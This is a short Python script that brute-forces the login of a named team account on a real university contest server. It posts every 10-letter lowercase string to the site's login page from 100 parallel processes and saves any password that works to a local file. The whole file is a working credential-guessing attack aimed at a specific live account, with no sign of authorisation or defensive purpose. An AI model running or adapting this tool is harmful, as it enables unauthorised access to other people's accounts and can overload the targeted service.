from itertools import product
import requests as r
import string
from functools import partial
import multiprocessing


alphabet = 'qwertyuiopasdfghjklzxcvbnm'
session = r.Session()

def check_pass(password):
    data = {'team': 'm19_90', 'password': password}
    url = 'https://acm.math.spbu.ru/tsweb/index.html'
    resp = session.post(url, data=data)
    print(resp.status_code, password, multiprocessing.current_process().name)
    if b'not logged' not in resp.content:
        print('---------------')
        with open('password', 'w') as f:
            f.write(password)

def main():
    n = 10
    # check_pass_with_session = partial(check_pass, s=s)
    all_repls_parent = [''.join(password) for password in product(alphabet, repeat=n)]
    # print(list(all_repls_parent))
    with multiprocessing.Pool(processes=100) as pool:
        res = pool.map(check_pass, all_repls_parent)
        print(list(res))

if __name__ == '__main__':
    main()

